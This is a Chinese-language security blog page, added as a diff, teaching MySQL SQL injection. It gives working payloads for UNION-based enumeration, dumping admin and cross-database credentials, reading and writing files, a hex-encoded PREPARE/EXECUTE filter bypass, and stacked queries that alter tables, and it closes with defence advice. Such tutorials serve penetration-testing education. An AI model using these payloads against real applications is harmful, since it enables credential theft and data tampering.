@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <link rel="stylesheet" href="/css/custom.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQL 注入实战与技巧</title>
+    <meta charset="utf-8">
+    <meta name="description" content="Ladder@SQL 注入实战与技巧 - Hzhsrc home">
+    <meta name="author" content="hzhsec">
+    <link rel="canonical" href="http://118.178.86.67/list/base_bug/sql%E6%B3%A8%E5%85%A5/sql1/">
+
+    <link rel="alternate" type="application/rss+xml" href="http://118.178.86.67//index.xml" title="Hzhsrc home">
+
+    
+
+
+    <meta property="og:title" content="SQL 注入实战与技巧" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://118.178.86.67/list/base_bug/sql%E6%B3%A8%E5%85%A5/sql1/" /><meta property="article:section" content="list" />
+<meta property="article:published_time" content="2024-04-20T15:40:00+08:00" />
+<meta property="article:modified_time" content="2024-04-20T15:40:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="SQL 注入实战与技巧"/>
+<meta name="twitter:description" content=""/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "目录",
+      "item": "http://118.178.86.67/list/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "基础漏洞",
+      "item": "http://118.178.86.67/list/base_bug/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  4 ,
+      "name": "SQL 注入实战与技巧",
+      "item": "http://118.178.86.67/list/base_bug/sql%E6%B3%A8%E5%85%A5/sql1/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SQL 注入实战与技巧",
+  "name": "SQL 注入实战与技巧",
+  "description": "",
+  "keywords": [
+    "SQL注入", "MySQL", "渗透测试"
+  ],
+  "articleBody": "一、目标与概述 目的：通过 SQL 注入（以 MySQL 为例）获取 Web 应用可操作的数据或权限（例如：查询数据库名称、表名、字段、读写文件、横向跨库取证等）。\n本笔记覆盖：\n常见检测与信息收集（系统、用户、数据库名、版本） 基于 information_schema 的枚举方法 跨库查询与文件读写（受限于权限与 secure-file-priv） 绕过/编码技巧、堆叠注入、Access 特殊处理 常用工具与防护建议 二、注入思路（四条信息） 开始注入前通常先判断以下四类信息，以便选择后续策略：\n数据库版本（version()）\nMySQL 5.0 以上自带 information_schema，能查询库/表/列等元信息。 常用判断：version() 或 select version()。 数据库用户（user()）\nroot 用户通常有更多权限（跨库/文件读写概率更高）；非 root 则可能受限。 常用判断：user()。 操作系统（@@version_compile_os）\n判断大小写敏感、路径风格（Windows C:\\ vs Linux /var/www）等。影响文件读写路径与大小写处理。 当前数据库名（database()）\n用于定位目标数据库，配合 information_schema 查找表名和字段名。 注：若目标无明显数据回显（盲注场景），需转为布尔/时间盲注或使用 out-of-band 技术。\n三、常见注入示例（回显型） 1. 排序/回显定位 -- 确定字段数量（order by） ... ORDER BY 6 -- 如果 6 报错说明列数小于 6 -- 使用 UNION 定位回显列 ... UNION SELECT 1,2,3,4,5,6 2. 在回显位置插入查询 -- 在可回显列插入 database(), user(), version() ... UNION SELECT 1,2,3,database(),user(),6 ... UNION SELECT 1,2,3,version(),@@version_compile_os,6 3. 利用 information_schema 枚举（MySQL \u003e= 5.0） -- 获取所有数据库名 ... UNION SELECT 1,2,3,4,GROUP_CONCAT(schema_name),6 FROM information_schema.schemata -- 获取特定数据库的表名 ... UNION SELECT 1,2,3,4,GROUP_CONCAT(table_name),6 FROM information_schema.tables WHERE table_schema='demo01' -- 获取表的字段名 ... UNION SELECT 1,2,3,4,GROUP_CONCAT(column_name),6 FROM information_schema.columns WHERE table_name='admin' -- 查询指定表的内容（限制行数） ... UNION SELECT 1,2,3,username,password,6 FROM admin LIMIT 0,1 group_concat() 常用于将多行合并成单行输出，适用于回显列有限的场景。\n四、跨库查询（PHP + MySQL 场景） 影响条件：取决于当前连接的 MySQL 用户权限（是否有访问其他库的权限，通常 root 可以）。\n示例：通过 B 网站的注入点，查询 A 网站数据库 zblog 中的表 zbp_member。\n-- 列出所有库 ... UNION SELECT 1,2,3,4,GROUP_CONCAT(schema_name),6 FROM information_schema.schemata -- 获取 zblog 库的表 ... UNION SELECT 1,2,3,4,GROUP_CONCAT(table_name),6 FROM information_schema.tables WHERE table_schema='zblog' -- 获取 zbp_member 的字段（指定库名以避免同名表干扰） ... UNION SELECT 1,2,3,4,GROUP_CONCAT(column_name),6 FROM information_schema.columns WHERE table_name='zbp_member' AND table_schema='zblog' -- 查询 zblog 库中具体表（前提：有权限） ... UNION SELECT 1,2,3,mem_Name,mem_Password,6 FROM zblog.zbp_member 结论：\n普通用户可能无法访问 information_schema 或其他库（会被拒绝或返回空）； root 或具有足够权限的用户可以跨库查询任意表。 五、文件读写（load_file / into outfile） 影响条件：数据库用户权限、secure-file-priv 配置、目标系统路径权限。\nsecure_file_priv\nsecure_file_priv 的值非NULL或包含了导出的绝对路径 secure_file_priv的值在mysql配置文件my.ini中设置，这个参数用来限制数据导入导出 Mysql\u003e=5.5.53 默认为NULL，即默认禁止导入导出 Mysql\u003c5.5.53 默认为空，即默认无限制\n查看secure_file_priv值的方法\n1.在my.ini配置文件里面看\n2.执行sql语句\nshow global variables like '%secure%'; secure_file_priv显示NULL说明没有权限\n需要在mysql目录下的my.ini修改配置文件secure_file_priv=空\n常见 payload：\n-- 读取目标文件（Windows 路径示例） ... UNION SELECT 1, LOAD_FILE('d:\\\\1.txt'),3,4,5,6 -- 写入文件到磁盘（需要 FILE 权限，并受 secure-file-priv 限制） ... UNION SELECT 1, '111',3,4,5,6 INTO OUTFILE 'd:\\\\2.txt' 路径获取技巧：\n错误信息常会泄露路径； phpinfo() 页面可能泄露安装路径； 猜测常见软件/中间件默认安装路径（如 /var/www/, C:\\xampp\\htdocs\\ 等）。 六、过滤绕过与编码技巧 1. 单引号过滤策略 如果单引号被过滤或转义：尝试使用十六进制编码、不带单引号的函数或利用注释闭合等方式。 常见方法：0x...（十六进制）、char()、concat()、prepare/execute 等。 2. 编码逃逸（示例） 将 SQL 语句以十六进制表示赋值给变量，再用 prepare ... from 与 execute 执行： -- 将 select * from `1919810931114514` 用 0x 十六进制编码后执行 1'; SET @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460; PREPARE execsql FROM @a; EXECUTE execsql; # 此类技巧常用来绕过 WAF 和字符串过滤。\n七、Access（MDB）与堆叠注入 Access 数据库（ASP + MDB） 无标准用户体系，用 sqlmap 字典爆破可能不稳定； 若知道表名/列名，直接用查询；若未知则需枚举或人工分析。 堆叠注入（Stacked Queries） MySQL 支持多语句（视驱动而定），可以使用 ; 执行多条语句（例如：SHOW DATABASES;）。 示例用法（查看/修改表结构）： -- 查看所有数据库 1'; SHOW DATABASES; -- -- 通过 rename / alter 做表改名或新增列（需足够权限） 1'; RENAME TABLE words TO BaiMao; ALTER TABLE words ADD id INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY; ALTER TABLE words CHANGE flag data VARCHAR(100);# 注意：堆叠注入在很多现代框架/驱动中被禁用或受限。\n八、读取技巧：HANDLER（替代 SELECT） HANDLER 操作常用于低级读取，示例：\n1'; HANDLER FlagHere OPEN; HANDLER FlagHere READ FIRST; HANDLER FlagHere CLOSE; 1'; HANDLER FlagHere OPEN; HANDLER FlagHere READ NEXT; HANDLER FlagHere CLOSE; 用于逐行读取表数据（在某些环境下比 SELECT 更易成功）。\n九、常用工具与检测流程 工具：sqlmap、Burp Suite、sqlninja（针对 MSSQL）、nmap --script（发现 web 漏洞）等。\n检测流程（典型）：\n参数注入点识别（GET/POST/头部/COOKIE）； 列数探测（ORDER BY）与回显列定位（UNION SELECT）； 信息枚举（version()、user()、database()）； 枚举 information_schema（表/列）； 数据提取（LIMIT 分页）或盲注（布尔/时间）; 横向扩展（跨库/文件读写）——视权限而定。 十、防护 使用参数化查询（Prepared Statements）或 ORM，避免字符串拼接 SQL； 对用户输入进行严格校验与最小化权限原则（数据库用户只赋予必要权限）； 关闭或限制 LOAD_FILE / INTO OUTFILE 权限；设置合理的 secure-file-priv； 数据库用户不使用 root：不同服务使用不同低权限用户； 开启 Web 应用 WAF 与异常日志告警，定期审计 SQL 日志； 对错误信息进行脱敏，避免泄露路径与 SQL 错误栈。 附：常见 payload ORDER BY n：探测列数 UNION SELECT ...：回显型注入 LOAD_FILE(...), INTO OUTFILE 'path'：文件读写 十六进制编码 + PREPARE/EXECUTE：绕过过滤 布尔/时间盲注：IF(condition, SLEEP(5), NULL) 参考 OWASP SQL Injection Cheat Sheet sqlmap 文档与使用手册 MySQL 官方文档（information_schema） ",
+  "wordCount" : "449",
+  "inLanguage": "en",
+  "datePublished": "2024-04-20T15:40:00+08:00",
+  "dateModified": "2024-04-20T15:40:00+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "hzhsec"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://118.178.86.67/list/base_bug/sql%E6%B3%A8%E5%85%A5/sql1/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Hzhsrc home",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://118.178.86.67/favicon.ico"
+    }
+  }
+}
+</script>
+    <link rel="icon" href="/images/hzhsec.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/hzhsec.png">
+
+<link rel="manifest" href="/images/hzhsec.png">
+    
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" />
+
+    
+    
+    <link rel="stylesheet" href="/css/main.min.ec28f09e946fc0df77c187fcd0d0ebde58fca6de8efb8e1620f3d45c32d4da88.css" integrity="sha256-7CjwnpRvwN93wYf80NDr3lj8pt6O&#43;44WIPPUXDLU2og=" crossorigin="anonymous" media="screen" />
+
+    
+    <link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />
+
+    
+    <script src="/js/highlight.min.min.c098d85b5396dec4707ea2cead1445b4dc2ff0fc56b8dbbd9049d0d1c50ad237.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    <script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script>
+    </head>
+<body>
+      <main class="wrapper"><nav class="navigation">
+    <section class="container">
+        <a class="navigation-brand" href="/">
+            主页
+        </a>
+        <input type="checkbox" id="menu-toggle" />
+        <label class="menu-button float-right" for="menu-toggle">
+            <span></span><span></span><span></span>
+        </label>
+        
+        <ul class="navigation-list" id="navigation-list">
+            
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/list/">目录</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/archives/">归档</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/message/">关于</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/categories/">分类</a>
+            </li>
+            
+            
+
+            <li class="navigation-item menu-separator">
+                <span>|</span>
+            </li>
+
+            
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="https://github.com/hzhsec">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github">
+      <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+    </svg>
+    </a>
+            </li>
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="/message/">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-mail">
+      <path d="M4 4h16v16H4z"></path><polyline points="4,4 12,12 20,4"></polyline>
+    </svg>
+    </a>
+            </li>
+            
+            
+
+            <li class="navigation-item navigation-dark">
+                <button id="mode" type="button" aria-label="toggle user light or dark theme">
+                    <span class="toggle-dark">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon">
+                            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                        </svg>
+                    </span>
+                    <span class="toggle-light">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun">
+                            <circle cx="12" cy="12" r="5"></circle>
+                            <line x1="12" y1="1" x2="12" y2="3"></line>
+                            <line x1="12" y1="21" x2="12" y2="23"></line>
+                            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                            <line x1="1" y1="12" x2="3" y2="12"></line>
+                            <line x1="21" y1="12" x2="23" y2="12"></line>
+                            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                        </svg>
+                    </span>
+                </button>
+            </li>
+            
+        </ul>
+        
+    </section>
+</nav>
+
+<div id="content">
+<article class="blog-single">
+  <header class="blog-title">
+    <h1>SQL 注入实战与技巧</h1>
+  </header>
+
+  <p>
+  <small>
+    April 20, 2024&nbsp;· 449 words&nbsp;· 3 min</small>
+
+  
+<p>
+
+  <div class="blog-toc">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-排序回显定位">1. 排序/回显定位</a></li>
+    <li><a href="#2-在回显位置插入查询">2. 在回显位置插入查询</a></li>
+    <li><a href="#3-利用-information_schema-枚举mysql--50">3. 利用 information_schema 枚举（MySQL &gt;= 5.0）</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#1-单引号过滤策略">1. 单引号过滤策略</a></li>
+    <li><a href="#2-编码逃逸示例">2. 编码逃逸（示例）</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#access-数据库asp--mdb">Access 数据库（ASP + MDB）</a></li>
+    <li><a href="#堆叠注入stacked-queries">堆叠注入（Stacked Queries）</a></li>
+  </ul>
+</nav>
+  </div>
+
+  <section class="blog-content"><h1 id="一目标与概述">一、目标与概述</h1>
+<p><strong>目的</strong>：通过 SQL 注入（以 MySQL 为例）获取 Web 应用可操作的数据或权限（例如：查询数据库名称、表名、字段、读写文件、横向跨库取证等）。</p>
+<p>本笔记覆盖：</p>
+<ul>
+<li>常见检测与信息收集（系统、用户、数据库名、版本）</li>
+<li>基于 <code>information_schema</code> 的枚举方法</li>
+<li>跨库查询与文件读写（受限于权限与 <code>secure-file-priv</code>）</li>
+<li>绕过/编码技巧、堆叠注入、Access 特殊处理</li>
+<li>常用工具与防护建议</li>
+</ul>
+<hr>
+<h1 id="二注入思路四条信息">二、注入思路（四条信息）</h1>
+<p>开始注入前通常先判断以下四类信息，以便选择后续策略：</p>
+<ol>
+<li>
+<p><strong>数据库版本</strong>（<code>version()</code>）</p>
+<ul>
+<li>MySQL 5.0 以上自带 <code>information_schema</code>，能查询库/表/列等元信息。</li>
+<li>常用判断：<code>version()</code> 或 <code>select version()</code>。</li>
+</ul>
+</li>
+<li>
+<p><strong>数据库用户</strong>（<code>user()</code>）</p>
+<ul>
+<li><code>root</code> 用户通常有更多权限（跨库/文件读写概率更高）；非 <code>root</code> 则可能受限。</li>
+<li>常用判断：<code>user()</code>。</li>
+</ul>
+</li>
+<li>
+<p><strong>操作系统</strong>（<code>@@version_compile_os</code>）</p>
+<ul>
+<li>判断大小写敏感、路径风格（Windows <code>C:\</code> vs Linux <code>/var/www</code>）等。影响文件读写路径与大小写处理。</li>
+</ul>
+</li>
+<li>
+<p><strong>当前数据库名</strong>（<code>database()</code>）</p>
+<ul>
+<li>用于定位目标数据库，配合 <code>information_schema</code> 查找表名和字段名。</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<p>注：若目标无明显数据回显（盲注场景），需转为布尔/时间盲注或使用 out-of-band 技术。</p>
+</blockquote>
+<hr>
+<h1 id="三常见注入示例回显型">三、常见注入示例（回显型）</h1>
+<h2 id="1-排序回显定位">1. 排序/回显定位</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">-- 确定字段数量（order by）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>... <span style="color:#66d9ef">ORDER</span> <span style="color:#66d9ef">BY</span> <span style="color:#ae81ff">6</span> <span style="color:#75715e">-- 如果 6 报错说明列数小于 6
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- 使用 UNION 定位回显列
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>... <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">6</span>
+</span></span></code></pre></div><h2 id="2-在回显位置插入查询">2. 在回显位置插入查询</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">-- 在可回显列插入 database(), user(), version()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>... <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#66d9ef">database</span>(),<span style="color:#66d9ef">user</span>(),<span style="color:#ae81ff">6</span>
+</span></span><span style="display:flex;"><span>... <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#66d9ef">version</span>(),<span style="color:#f92672">@@</span>version_compile_os,<span style="color:#ae81ff">6</span>
+</span></span></code></pre></div><h2 id="3-利用-information_schema-枚举mysql--50">3. 利用 information_schema 枚举（MySQL &gt;= 5.0）</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">-- 获取所有数据库名
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>... <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,GROUP_CONCAT(<span style="color:#66d9ef">schema_name</span>),<span style="color:#ae81ff">6</span> <span style="color:#66d9ef">FROM</span> information_schema.schemata
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- 获取特定数据库的表名
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>... <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,GROUP_CONCAT(<span style="color:#66d9ef">table_name</span>),<span style="color:#ae81ff">6</span> <span style="color:#66d9ef">FROM</span> information_schema.tables <span style="color:#66d9ef">WHERE</span> table_schema<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;demo01&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- 获取表的字段名
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>... <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,GROUP_CONCAT(<span style="color:#66d9ef">column_name</span>),<span style="color:#ae81ff">6</span> <span style="color:#66d9ef">FROM</span> information_schema.columns <span style="color:#66d9ef">WHERE</span> <span style="color:#66d9ef">table_name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;admin&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- 查询指定表的内容（限制行数）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>... <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,username,password,<span style="color:#ae81ff">6</span> <span style="color:#66d9ef">FROM</span> <span style="color:#66d9ef">admin</span> <span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><blockquote>
+<p><code>group_concat()</code> 常用于将多行合并成单行输出，适用于回显列有限的场景。</p>
+</blockquote>
+<hr>
+<h1 id="四跨库查询php--mysql-场景">四、跨库查询（PHP + MySQL 场景）</h1>
+<p><strong>影响条件</strong>：取决于当前连接的 MySQL 用户权限（是否有访问其他库的权限，通常 <code>root</code> 可以）。</p>
+<p><strong>示例</strong>：通过 B 网站的注入点，查询 A 网站数据库 <code>zblog</code> 中的表 <code>zbp_member</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">-- 列出所有库
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>... <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,GROUP_CONCAT(<span style="color:#66d9ef">schema_name</span>),<span style="color:#ae81ff">6</span> <span style="color:#66d9ef">FROM</span> information_schema.schemata
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- 获取 zblog 库的表
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>... <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,GROUP_CONCAT(<span style="color:#66d9ef">table_name</span>),<span style="color:#ae81ff">6</span> <span style="color:#66d9ef">FROM</span> information_schema.tables <span style="color:#66d9ef">WHERE</span> table_schema<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;zblog&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- 获取 zbp_member 的字段（指定库名以避免同名表干扰）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>... <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,GROUP_CONCAT(<span style="color:#66d9ef">column_name</span>),<span style="color:#ae81ff">6</span> <span style="color:#66d9ef">FROM</span> information_schema.columns <span style="color:#66d9ef">WHERE</span> <span style="color:#66d9ef">table_name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;zbp_member&#39;</span> <span style="color:#66d9ef">AND</span> table_schema<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;zblog&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- 查询 zblog 库中具体表（前提：有权限）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>... <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,mem_Name,mem_Password,<span style="color:#ae81ff">6</span> <span style="color:#66d9ef">FROM</span> zblog.zbp_member
+</span></span></code></pre></div><p><strong>结论</strong>：</p>
+<ul>
+<li>普通用户可能无法访问 <code>information_schema</code> 或其他库（会被拒绝或返回空）；</li>
+<li><code>root</code> 或具有足够权限的用户可以跨库查询任意表。</li>
+</ul>
+<hr>
+<h1 id="五文件读写load_file--into-outfile">五、文件读写（load_file / into outfile）</h1>
+<p><strong>影响条件</strong>：数据库用户权限、<code>secure-file-priv</code> 配置、目标系统路径权限。</p>
+<p><strong>secure_file_priv</strong></p>
+<ul>
+<li>secure_file_priv 的值非NULL或包含了导出的绝对路径</li>
+<li>secure_file_priv的值在mysql配置文件my.ini中设置，这个参数用来限制数据导入导出</li>
+</ul>
+<p>Mysql&gt;=5.5.53 默认为NULL，即默认禁止导入导出
+Mysql&lt;5.5.53 默认为空，即默认无限制</p>
+<p><strong>查看secure_file_priv值的方法</strong></p>
+<p>1.在my.ini配置文件里面看</p>
+<p>2.执行sql语句</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">show</span> <span style="color:#66d9ef">global</span> variables <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;%secure%&#39;</span>;
+</span></span></code></pre></div><p>secure_file_priv显示NULL说明没有权限</p>
+<p>需要在mysql目录下的my.ini修改配置文件secure_file_priv=空</p>
+<p>常见 payload：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">-- 读取目标文件（Windows 路径示例）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>... <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>, LOAD_FILE(<span style="color:#e6db74">&#39;d:\\1.txt&#39;</span>),<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">6</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- 写入文件到磁盘（需要 FILE 权限，并受 secure-file-priv 限制）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>... <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;111&#39;</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">6</span> <span style="color:#66d9ef">INTO</span> OUTFILE <span style="color:#e6db74">&#39;d:\\2.txt&#39;</span>
+</span></span></code></pre></div><p><strong>路径获取技巧</strong>：</p>
+<ol>
+<li>错误信息常会泄露路径；</li>
+<li><code>phpinfo()</code> 页面可能泄露安装路径；</li>
+<li>猜测常见软件/中间件默认安装路径（如 <code>/var/www/</code>, <code>C:\xampp\htdocs\</code> 等）。</li>
+</ol>
+<hr>
+<h1 id="六过滤绕过与编码技巧">六、过滤绕过与编码技巧</h1>
+<h2 id="1-单引号过滤策略">1. 单引号过滤策略</h2>
+<ul>
+<li>如果单引号被过滤或转义：尝试使用十六进制编码、不带单引号的函数或利用注释闭合等方式。</li>
+<li>常见方法：<code>0x...</code>（十六进制）、<code>char()</code>、<code>concat()</code>、<code>prepare/execute</code> 等。</li>
+</ul>
+<h2 id="2-编码逃逸示例">2. 编码逃逸（示例）</h2>
+<ul>
+<li>将 SQL 语句以十六进制表示赋值给变量，再用 <code>prepare ... from</code> 与 <code>execute</code> 执行：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">-- 将 select * from `1919810931114514` 用 0x 十六进制编码后执行
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;; SET @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460; PREPARE execsql FROM @a; EXECUTE execsql; #
+</span></span></span></code></pre></div><p>此类技巧常用来绕过 WAF 和字符串过滤。</p>
+<hr>
